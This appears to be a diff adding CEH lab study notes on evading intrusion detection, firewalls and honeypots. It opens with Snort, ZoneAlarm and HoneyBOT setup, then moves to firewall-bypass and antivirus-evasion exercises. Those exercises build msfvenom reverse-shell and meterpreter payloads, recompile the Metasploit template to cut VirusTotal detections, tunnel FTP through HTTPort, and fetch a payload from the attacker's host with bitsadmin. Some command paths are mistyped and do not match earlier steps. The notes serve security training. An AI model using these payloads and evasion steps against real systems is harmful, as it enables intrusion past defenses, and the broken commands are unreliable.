@@ -1,0 +1,366 @@
+Module 12: Evading IDS, Firewalls, and Honeypots
+
+
+
+1. Perform intrusion detection using various tools
+
+Main Functions of IDS:
+
+- Gathers and analyzes information from within a computer or a network, to identify the possible violations of security policy
+- Also referred to as a “packet-sniffer,” which intercepts packets traveling along various communication mediums and protocols
+- Evaluates traffic for suspected intrusions and signals an alarm after detection
+
+
+a. Detect intrusions using Snort
+
+PS: Snort is an open-source network intrusion detection system, capable of performing real-time traffic analysis and packet logging on IP networks. It can perform protocol analysis and content searching/matching and is used to detect a variety of attacks and probes such as buffer overflows, stealth port scans, CGI attacks, SMB probes, and OS fingerprinting attempts. It uses a flexible rules language to describe traffic to collect or pass, as well as a detection engine that utilizes a modular plug-in architecture.
+
+Step 1: Install Snort on Victim (.19)
+
+Z:\CEHv12 Module 12 Evading..\Intrusion..\Snort  double-click Snort_2_9_15_Installer.exe -> I Agree -> Close -> Ok  (After installation)
+
+Z:\CEHv12 Module 12 Evading..\Intrusion..\Snort\snortrules-snapshot-29150\etc copy snort.conf -> paste in C:\Snort\etc (replace the existing file)
+
+Z:\CEHv12 Module 12 Evading..\Intrusion..\Snort\snortrules-snapshot-29150 copy so_rules -> paste in C:\Snort
+
+Z:\CEHv12 Module 12 Evading..\Intrusion..\Snort\snortrules-snapshot-29150 copy preproc_rules -> paste in C:\Snort (replace exisiting)
+
+Z:\CEHv12 Module 12 Evading..\Intrusion..\Snort\snortrules-snapshot-29150 copy rules -> paste in C:\Snort
+
+Launch cmd.exe
+
+$ cd C:\Snort\bin
+$ snort  (Snort initializes. When complete,Ctrl+C. Snort exits and comes back to C:\Snort\bin
+$ snort -W  (list your machine's physical address, IP, Ethernet Drivers- but all are disabled) (Note your driver index number)
+$ snort -dev -i (driver index number)    (This enables the Ethernet Driver)
+
+Leave Snort Command Prompt and launch a new cmd
+
+$ ping google.com
+
+Close both cmd
+
+Step 2: Configure snort.conf file.
+
+C:\Snort\etc
+Open snort.conf file with Notepad++
+
+Scroll down to the Step #1: Set the network variables section (Line 41) of the snort.conf file. In the HOME_NET line (Line 45), replace any with the IP addresses of the machine (target machine) on which Snort is running. Here, the target machine is Windows Server 2019 and the IP address is 10.10.1.19.
+
+If you have a DNS Server, then make changes in the DNS_SERVERS line by replacing $HOME_NET with your DNS Server IP address; otherwise, leave this line as it is. Here, the DNS server is 8.8.8.8.
+
+The same applies to SMTP_SERVERS, HTTP_SERVERS, SQL_SERVERS, TELNET_SERVERS, and SSH_SERVERS.
+
+Scroll down to RULE_PATH (Line 104). In Line 104, replace ../rules with C:\Snort\rules in Line 105, replace ../so_rules with C:\Snort\so_rules and in Line 106, replace ../preproc_rules with C:\Snort\preproc_rules.
+
+In Lines 109 and 110, replace ../rules with C:\Snort\rules. Minimize the Notepad++ window.
+
+Navigate to C:\Snort\rules, and create two text files; name them white_list and black_list and change their file extensions from .txt to .rules. To create a text file, right-click anywhere inside the rules window and navigate to New --> Text Document.
+
+Switch back to Notepad++, scroll down to the Step #4: Configure dynamic loaded libraries section (Line 238). Configure dynamic loaded libraries in this section.
+
+Add the path to dynamic preprocessor libraries (Line 243); replace /usr/local/lib/snort_dynamicpreprocessor/ with your dynamic preprocessor libraries folder location. In this task, the dynamic preprocessor libraries are located at C:\Snort\lib\snort_dynamicpreprocessor.
+
+At the path to base preprocessor (or dynamic) engine (Line 246), replace /usr/local/lib/snort_dynamicengine/libsf_engine.so with your base preprocessor engine C:\Snort\lib\snort_dynamicengine\sf_engine.dll.
+
+Ensure that the dynamic rules libraries (Line 250) is commented out, as you have already configured the libraries in dynamic preprocessor libraries.
+
+Scroll down to the Step #5: Configure preprocessors section (Line 253), the listed preprocessor. This does nothing in IDS mode, however, it generates errors at runtime.
+Comment out all the preprocessors listed in this section by adding ‘#’ and (space) before each preprocessor rule (262-266).
+
+Scroll down to line 326 and delete lzma keyword and a (space).
+
+Scroll down to Step #6: Configure output plugins (Line 513). In this step, provide the location of the classification.config and reference.config files.
+These two files are in C:\Snort\etc. Provide this location of files in the configure output plugins (in Lines 532 and 533) (i.e., C:\Snort\etc\classification.config and C:\Snort\etc\reference.config)
+
+In Step #6, add to line (534) output alert_fast: alerts.ids: this command orders Snort to dump all logs into the alerts.ids file
+
+In the snort.conf file, find and replace the ipvar string with var. To do this, press Ctrl+H on the keyboard. The Replace window appears; enter ipvar in the Find what : text field, enter var in the Replace with : text field, and click Replace All.
+
+Click Close to close the Replace window.
+
+Save the snort.conf file by pressing Ctrl+S and close Notepad++ window.
+
+Navigate to C:\Snort\rules and open the icmp-info.rules file with Notepad++.
+In line 21, type alert icmp $EXTERNAL_NET any -> $HOME_NET 10.10.1.19 (msg:"ICMP-INFO PING"; icode:0; itype:8; reference:arachnids,135; reference:cve,1999-0265; classtype:bad-unknown; sid:472; rev:7;) and save. Close the Notepad++ window.
+
+Launch cmd.exe
+
+$ cd C:\Snort\bin
+$ snort -i1 -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -k ascii   (-i = device index number. This command starts Snort)
+
+NB: If you receive a fatal error, you should first verify that you have typed all modifications correctly into the snort.conf file, and then search through the file for entries matching your fatal error message.
+
+NB: If you receive an error stating “Could not create the registry key,” then run the command prompt as Administrator.
+
+After initializing interface and logged signatures, Snort starts and waits for an attack and triggers alerts when attacks occur on the machine.
+
+Step 3: Attack your device, and check wether Snort detects it or not (.11)
+
+Open cmd.exe
+
+$ ping 10.10.1.19 -t
+
+Observe the alert by Snort
+Ctrl+C   (Stop Snort)
+
+Go to the C:\Snort\log\10.10.1.11 folder and open the ICMP_ECHO.ids file with Notepad++. You see that all the log entries are saved in the ICMP_ECHO.ids file
+
+
+
+
+
+
+b. Detect malicious network traffic using ZoneAlarm FREE FIREWALL
+
+Step 1: Install ZoneAlarm FREE FIREWALL on .11
+
+E:\CEH-Tools\..\Firewalls\ZoneAlarm..  double-click zafwSetupWeb_... -> Check: By Clicking here, you accept.. -> Custom Install -> End User License Agreement: Agree -> Set Application Control to AUTO-LEARN mode -> Next -> Skip -> Installation Successful: Finish
+
+Step 2: Configure URL to block
+
+ZoneAlarm main Window -> FIREWALL -> View Zones -> Add -> Host/Site -> Zone: Blocked, Hostname: www.moviescope.com, Description: Block This Site, Lookup -> Ok -> Ok 
+
+Step 3: Try Visit Blocked Site
+
+Open any browser (Chrome) -> www.moviescope.com
+
+Step 4: Uninstall ZoneAlarm Firewall
+
+ZoneAlarm Firewall Settings -> select the created rule -> Remove -> Ok
+Show hidden icon -> Right-click ZoneAlarm -> Exit -> Restart Computer -> Uninstall ZoneAlarm from Control Panel.
+
+
+
+
+
+c. Detect malicious network traffic using HoneyBOT
+
+PS: HoneyBOT is a medium interaction honeypot for windows. A honeypot creates a safe environment to capture and interact with unsolicited traffic on a network. 
+
+Step 1: Install HoneyBOT (.22)
+
+Z:\..\Honeypot..\HoneyBOT  double-click HoneyBOT_018.exe -> Uncheck: Launch HoneyBOT -> Finish
+
+Step 2: Configure HoneyBOT
+
+Start -> Recently added -> right-click HoneyBOT -> More -> Run as Administrator -> Yes -> Exports -> Check: Export Logs to CSV, Upload Logs to Server -> Updates -> Uncheck: Check for Updates -> Apply -> OK 
+
+Step 3: Telnet (and ftp) to Victim (.22) from Attacker (.13 Parrot)
+
+$ telnet 10.10.1.22
+
+Step 4: Check Details of Attacker Machine from .22
+
+Expand Ports and Remote -> right-click IP or Port -> View Details 
+
+
+
+
+
+2. Evade firewalls using various evasion techniques
+
+The following are some firewall bypassing techniques
+
+- Port Scanning
+- Firewalking
+- Banner Grabbing
+- IP Address Spoofing
+- Source Routing
+- Tiny Fragments
+- Using an IP Address in Place of URL
+- Using Anonymous Website Surfing Sites
+- Using a Proxy Server
+- ICMP Tunneling
+- ACK Tunneling
+- HTTP Tunneling
+- SSH Tunneling
+- DNS Tunneling
+- Through External Systems
+- Through MITM Attack
+- Through Content
+- Through XSS Attack
+
+
+
+a. Bypass windows firewall using Nmap evasion techniques
+
+Step 1: (.11) - Enable Firewall, Add Inbound rule to block Attacker (.13) Machine
+
+Control Panel -> System and Security -> windows Defender Firewall -> Use recommended settings -> Advanced settings 
+Inbound Rule -> New Rule -> Rule Type: Custom -> Next -> Program: All programs -> Next -> Protocol and Ports: Any -> Next -> 
+Scope: Which Local IP - Any, Which remote IP - These IP addresses (Add) -> This IP addresses or subnet - 10.10.1.13 -> Ok -> Next -> Action: Block the connection -> Next -> Profile: Check All -> Next -> Name: Block Parrot Security -> Finish
+
+Step 2: Try Bypass the Rule from Attacker Machine (.13)
+
+$ nmap 10.10.1.11       (Blocked/filtered)
+$ nmap -sS 10.10.1.11   (TCP SYN Port Scan. Blocked)
+$ nmap -T4 -A 10.10.1.11  (INTENSE Scan. Blocked)
+$ nmap -sP 10.10.1.0/24  (Ping Sweep. Host is up, but it's still blocking)
+$ nmap -sI 10.10.1.22 10.10.1.11   (Zombie Scan. .22 is the Zombie. The Open Ports are shown)
+
+
+
+
+
+b. Bypass firewall rules using HTTP/FTP tunneling
+
+PS: HTTPort allows users to bypass the HTTP proxy, which blocks Internet access to e-mail, instant messengers, P2P file sharing, ICQ, News, FTP, IRC, etc. Here, the Internet software is configured, so that it connects to a local PC as if it is the required remote server; HTTPort then intercepts that connection and runs it via a tunnel through the proxy. HTTPort can work on devices such as proxies or firewalls that allow HTTP traffic. 
+
+PS: HTTPort performs tunneling using one of two modes: SSL/CONNECT mode and a remote host.
+
+Step 1: Configure HTTHost on Server 22 (.22)
+
+Disable World Wide Web Publishing Services
+Start -> Windows Administrative Tools -> Services (double-click) -> World Wide Web Publishing Service (double-click) -> Startup Type: Disabled -> Apply -> Ok
+
+Stop IIS Admin Service in Similar Way.
+
+Z:\CEHv12..\HTTP Tun..\HTTHost double-click htthost.exe -> Options -> 
+Bind listening to: 0.0.0.0
+Port: 90
+Bind external to: 0.0.0.0
+Allow access from: 0.0.0.0
+Personal password: magic
+
+Host name or IP: 127.0.0.1
+Port: 81
+Original IP header field: X-Original-IP
+Max. local buffer: 256k
+Timeouts: 0:1:2
+Reliable DNS name: Check
+Log connection: Check
+
+Apply
+
+-> Application Log
+Ensure last line is Listener: listening at 0.0.0.0:90 (ensures HTTHost is runningand listening on Port 90)
+
+Step 2: Add Fiewall Rule to Block Outbound ftp on Server 2019 (.19)
+
+Control Panel -> System and security -> Windows Defender Firewall -> Turn Windows defender Firewall on or off -> Turn both On -> Ok
+Advanced Settings -> Outbound Rules -> New Rule -> Rule Type: Port -> Next -> Protocoland Ports: TCP, All remote ports -> Action: Block the Connection -> Profile: Check all -> Name: Port 21 Blocked -> Finish
+Right-click "Port 21 Blocked" -> Properties -> Protocols and Ports: Specific ports, 21 -> Apply -> Ok 
+
+Step 3: Test ftp Connection from Server 2019 (.19)
+
+Disable the new created rule
+Right-click -> Disable Rule
+Launch cmd.exe
+
+$ ftp 10.10.1.11 (you will be asked for username, showing you can connect to Windows 11 via ftp)
+Close cmd
+
+Enable the new Firewall Rule (Port 21 Blocked)
+Right-click -> Enable Rule
+
+Launch cmd.exe
+$ ftp 10.10.1.11   (the added rule has blocked ftp connection)
+
+Step 4: Configure HTTPort on Server 2019 (.19) for Tunnelling to HTTHost
+
+Z:\CEHv12..\HTTP Tun..\HTTPort  double-click httport3snfm.exe -> Install
+Start -> Httport3SNFM -> Next X5 -> Close -> Proxy 
+Host name or IP address: 10.10.1.22
+Port: 90
+
+User-Agent: IE 6.0
+Bypass mode: Remote host
+
+Host name or IP address: 10.10.1.22
+Port: 90
+Password: magic
+
+-> Port mapping -> Add (create a new mapping)
+Right-click new mapping -> Edit -> Rename(ftp test)
+Right-click the node below Local port; then click Edit and enter the port value as 21
+Right-click the node below Remote host; click Edit and rename it as 10.10.1.11
+Right-click the node below Remote port; then click Edit and enter the port value as 21
+
+-> Proxy -> Start (start HTTP tunnelling)
+
+Step 5: Test ftp to Windows 11 Machine (.11)
+
+PS: HTTPort intercepts the ftp request to the localhost and tunnels through it. HTTHost is installed in the remote machine to connect you to 10.10.1.11.
+
+Note: This means you may not access the ftp site directly by issuing ftp 10.10.1.11 in the command prompt, but you will be able to access it through the localhost by issuing the command ftp 127.0.0.1.
+
+Launch cmd.exe
+$ ftp 10.10.1.11  (ftp connection is blocked by outbound firewall)
+
+Launch a new cmd.exe
+$ ftp 127.0.0.1 (you should connect)
+$ User: Jason
+$ Password: qwerty
+ftp> mkdir Test    (Create folder 'Test' in C:\FTP of Windows 11 Machine)
+
+
+
+
+
+c. Bypass antivirus using Metasploit templates
+
+Step 1: Create Payload (.13)
+
+$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -f exe >/home/attacker/Desktop/Windows.exe
+
+Step 2: Check Detection rate on Virustotal
+
+https://www.virustotal.com (54 out of 70 Anti virus detected it)
+
+Step 3:Edit the metasploit Template and reduce the Payload Size
+
+$ pluma /usr/share/metasploit-framework/data/templates/src/pe/exe/template.c 
+in the line 3 change the payload size from 4096 to 4000, save the file and close the editor.
+
+$ cd /usr/share/metasploit-framework/data/templates/src/pe/exe   
+$ i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe  (recompile the standard template)
+$ ls
+
+Step 4: Generate New Payload using the New Compiled Template
+
+$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -x /usr/share/metaspoit-framework/data/templates/src/pe/exe/evasio.exe -f exe > /home/attacker/Desktop/bypass.exe
+
+Step 5: Upload new Payload (bypass.exe) to VirusTotal and checknew raing.
+Only 48 out of 71 Antivirus Flagged it.
+
+
+
+
+
+
+d. Bypass firewall through Windows BITSAdmin
+
+PS: BITS (Background Intelligent Transfer Service) is used by system administrators and programmers for downloading files from or uploading files to HTTP webservers and SMB file shares.
+
+PS: BITSAdmin is a tool that is used to create download or upload jobs and monitor their progress.
+
+Step 1: Turn on Windows Defender Firewall (.19)
+
+Step 2: Create a Payload and Share it (.13)
+
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Exploit.exe
+$ mkdir /var/www/html/share
+$ chmod -R 755 /var/www/html/share
+$ chown -R www-data:www-data /var/www/html/share
+$ cp /home/attacker/Desktop/Exploit.exe /var/www/html/share
+$ service apache2 start
+
+Step 3: Download the file in (.19) Machine even with Firewall On
+
+Start -> powershell -> Windows PowerShell
+
+$ bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe  (Transfer payload from nwk share to C drive).
+
+
+
+
+
+
+
+
+
+
+
+
+
